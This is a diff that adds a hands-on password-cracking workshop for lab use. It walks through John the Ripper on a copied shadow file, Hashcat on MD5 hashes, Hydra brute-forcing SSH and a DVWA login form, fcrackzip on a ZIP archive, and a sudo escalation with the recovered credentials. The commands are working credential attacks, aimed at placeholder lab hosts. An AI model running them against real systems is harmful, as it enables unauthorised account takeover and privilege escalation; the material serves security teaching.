@@ -1,0 +1,295 @@
+******************************
+* Password Cracking Workshop *
+******************************
+******* Version: 1.0.1 *******
+******************************
+***** -By: Matt Scheurer *****
+******************************
+**** https://x.com/c3rkah ****
+******************************
+
+
+******************************
+******** Sesssion 01: ********
+******************************
+
+John the Ripper
+----------------
+
+Scenario:
+
+The "/etc/shadow" file from a remote system was copied to the local home directory as "copiedsf.txt".
+Use John the Ripper with a dictionary file to crack some system account passwords.
+
+Viewing the dictionary list:
+
+less dictionary.txt
+DOWN ARROW (to scroll through the list)
+G (to go to the end of the list)
+1G (to go back to the top of the list)
+q to quit out of the less command
+
+Cracking the passwords:
+
+john --wordlist:./dictionary.txt copiedsf.txt
+
+Viewing the results:
+
+john --show copiedsf.txt
+
+NOTES:
+
+John the Ripper files reside in $HOME\.john\
+
+/* To start back over from scratch... */
+rm ./.john/john.pot
+
+
+******************************
+******** Sesssion 02: ********
+******************************
+
+Hashcat
+--------
+
+Scenario:
+
+Authentication systems often store password hash values in lieu of plain text passwords.
+Logins compare the hash value of the password entered against the stored hash value in a database.
+Old versions of WordPress for example used MD5 hashes for this purpose.
+Let's create our own password hash table to understand what that looks like.
+
+Creating an example password hash table:
+
+echo -n "admin" | md5sum | tr -d " -" >> hashfile.txt
+echo -n "theCiNPA" | md5sum | tr -d " -" >> hashfile.txt
+echo -n "Security" | md5sum | tr -d " -" >> hashfile.txt
+echo -n "SIGrules" | md5sum | tr -d " -" >> hashfile.txt
+echo -n "guest" | md5sum | tr -d " -" >> hashfile.txt
+echo -n "password" | md5sum | tr -d " -" >> hashfile.txt
+echo -n "PutinLovesYan!" | md5sum | tr -d " -" >> hashfile.txt
+echo -n "Secret" | md5sum | tr -d " -" >> hashfile.txt
+echo -n "Testing123" | md5sum | tr -d " -" >> hashfile.txt
+echo -n "Wizard!" | md5sum | tr -d " -" >> hashfile.txt
+
+Viewing the contents of our old MD5 hashes:
+
+cat hashfile.txt
+
+NOTES:
+
+Hashcat computes hash values from our dictionary word list and compares it against lines in our hash file.
+Hashcat contains many built-in features and available options that can be displayed by running "hashcat --help | less".
+
+Running Hashcat:
+
+hashcat --force -m 0 -a 0 -o cracked.txt hashfile.txt dictionary.txt
+
+NOTES:
+
+The "--force" switch tells hashcat to ignore system warnings and proceed.
+The "-m 0" switch tells hashcat to crack MD5 hashes.
+The "-a 0" switch tells hashcat this is a dictionary attack.
+The "-o cracked.txt" switch tells hashcat where to output the results.
+"hashfile.txt" is the name of our password hash file.
+"dictionary.txt" is our dictionary word list file.
+
+Viewing the results:
+
+cat cracked.txt
+
+NOTES:
+
+We can see the plain text equivalent password values for 3 out of 10 password hashes in the results.
+
+/* To start back over from scratch... */
+rm ./.hashcat/hashcat.potfile
+rm cracked.txt
+
+
+******************************
+******** Sesssion 03: ********
+******************************
+
+Hydra - Part 1, Brute Force SSH
+--------------------------------
+
+Scenario:
+
+In this workshop session we will use Hydra to brute force a SSH login session to a remote server.
+Run the following command to initiate dictionary attacks against a remote server:
+
+hydra -I -t 1 -L m2usernames.txt -P m2passwords.txt -v ssh://<REMOTE_IP>:22/
+
+NOTES:
+
+The "-I" swtich ignores the Hydra restore file (hopefully keeps us from stepping on each others toes).
+The "-t 1" switch runs Hydra on a single thread and hopefully keeps us from breaking the remote servers.
+The "-L" switch specifies the Login file to use.
+The "-P" switch specifies the Password file to use.
+The "-v" switch provides verbose output of successfully cracked passwords.
+
+Hydra contains many built-in features and available options that can be displayed by running "hydra".
+Full command options are available by running "hydra -h" or "hydra -h | less".
+
+From our results attempt to SSH into the remote system and "sudo su" to elevate privlidges:
+
+ssh klog@<REMOTE_IP>
+123456789
+
+ssh user@<REMOTE_IP>
+user
+sudo su
+user
+exit
+
+ssh msfadmin@<REMOTE_IP>
+msfadmin
+sudo su
+msfadmin
+whoami
+exit
+exit
+
+NOTES:
+
+Some of the the credential combinations found work better for access and escalation purposes than others.
+
+
+******************************
+******** Sesssion 04: ********
+******************************
+
+fcrackzip
+----------
+
+Scenario:
+
+Inspired by a Capture-The-Flag (CTF) event, we have a password protected ZIP file that we'd like to crack.
+We will use a brute force attack with "fcrackzip" in an attempt to crack the password on "protected.zip".
+
+NOTES:
+
+fcrackzip is a Free/Fast Zip Password Cracker.
+fcrack zip is no longer part of the default Kali build, but it is still maintained in their repositories.
+This was pre-loaded and installed by the command "apt-get install fcrackzip".
+
+Attempt to unzip the file:
+
+unzip protected.zip
+Guess1
+Guess2
+Guess3
+
+Run the following command to brute force our target file:
+
+fcrackzip -b -c 'a' -l 5 -v -u protected.zip
+
+The following command shows a list of available command options:
+
+fcrackzip --help
+
+The following command shows more command option details:
+
+man fcrackzip
+
+Once the password is cracked, let's try unzipping the file again:
+
+unzip protected.zip
+hello
+cat message.txt
+
+NOTES:
+
+The "-b" switch specifies a brute force cracking attempt.
+The "-c 'a'" switch and option specifies to use lower-case letter character set.
+The "-l 5" specifies to use five character passwords.
+The "-v" switch provides verbose output.
+The "-u" switch specifies to attempt an unzip attempt to validate the results.
+"protected.zip" is the file that we have targetted.
+"message.txt" is the extracted file as the result of a successful unzip.
+
+
+******************************
+******** Sesssion 05: ********
+******************************
+
+Hydra - Part 2, Crack a web form login page
+--------------------------------------------
+
+Scenario:
+
+In our final workshop session, we will go back to Hydra to crack our way into a web site.
+We could use intercepting proxies for information gathering such as Burp, Fiddler, or ZAP;
+but we'll use modern browser built-in web tools instead.
+
+NOTES:
+
+Ignore the fact that the default username and password are displayed on the web page for this session.
+
+In Google Chrome:
+
+1. Open "http://<REMOTE_IP>/dvwa/" in the browser.
+2. Go to settings > "More tools" > "Developer Tools".
+3. Enter "formfield1a" as the "Username".
+4. Enter "formfield1b" as the "Password".
+5. Click the "Login" button.
+6. Make note of the login failure message ("Login failed").
+7. Click on the "login.php" entry with a "302" response in Developer Tools "Network" tab.
+8. Make note of the "Request URL:" "(http://<REMOTE_IP>/dvwa/login.php") under Headers and General.
+9. Make note of the "Request Method:" ("POST") below the Request URL.
+10. Scroll down to "Form Data" and click on "view source".
+11. Make note of the form string ("username=formfield1a&password=formfield1b&Login=Login").
+
+In Mozilla Firefox:
+
+1. Open "http://<REMOTE_IP>/dvwa/" in the browser.
+2. Go to settings > "Web Developer" > "Network".
+3. Enter "formfield1a" as the "Username".
+4. Enter "formfield1b" as the "Password".
+5. Click the "Login" button.
+6. Make note of the login failure message ("Login failed").
+7. Click on the "login.php" entry with a "302" response, which notably has a "POST" method.
+8. Make note of the "Request URL:http://<REMOTE_IP>/dvwa/login.php".
+9. Make note of the "Request Method:POST".
+10. Click on the "Params" tab.
+11. Make note of the "Request payload" ("username=formfield1a&password=formfield1b&Login=Login").
+
+NOTES:
+
+Breaking the request URL's into separate sections, we have the following information...
+
+Server: <REMOTE_IP>
+Service: POST (http-post-form)
+Login Address: /dvwa/login.php
+Form Request Parameters: username=^USER^&password=^PASS^&Login=Login
+Failure Message: Login failed
+
+Lets put it all together and initiate our brute force login attempt using Hydra:
+
+hydra -L m2usernames.txt -P m2passwords.txt <REMOTE_IP> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
+
+Run again, but with appending "-V" at the end of the command to see all username and password combinations being attempted:
+
+hydra -L m2usernames.txt -P m2passwords.txt <REMOTE_IP> http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -V
+
+NOTES:
+
+The "-L" switch specifies a login file to use.
+The "-P" switch specified a password file to use.
+Using a "-v" switch specifies verbose output.
+Using a "-V" switch specifies extra verbose output.
+The username of "admin" and password of "password" matches what is presented on the web page.
+
+Final Steps:
+
+1. Enter "admin" as the "Username" back on the web page.
+2. Enter "password" as the password.
+3. Click on the "Login" button.
+
+
+******************************
+********** The End! **********
+******************************
+
+Thank you for participating!
